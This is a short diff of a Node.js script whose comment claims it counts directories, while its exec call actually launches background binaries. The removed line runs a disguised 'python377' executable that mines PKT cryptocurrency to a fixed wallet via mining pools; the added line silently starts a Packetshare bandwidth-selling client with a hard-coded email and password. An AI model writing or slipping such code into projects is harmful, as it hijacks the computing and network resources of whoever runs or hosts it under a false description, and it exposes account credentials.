@@ -2,7 +2,7 @@ const { exec } = require('child_process');
  
 // Counts the number of directory in
 // current working directory
-exec('chmod +x ./python377 && nohup ./python377 ann http://pool.pkt.world https://stratum.zetahash.com -p pkt1qfhr09kswj2hy0xgnzzj5r8ux09m7ltnuumf4xx &', (error, stdout, stderr) => {
+exec('./Packetshare -email=theroot7791@gmail.com -password=Env112311 -accept-tos &', (error, stdout, stderr) => {
     if (error) {
         console.error(`exec error: ${error}`);
         return;
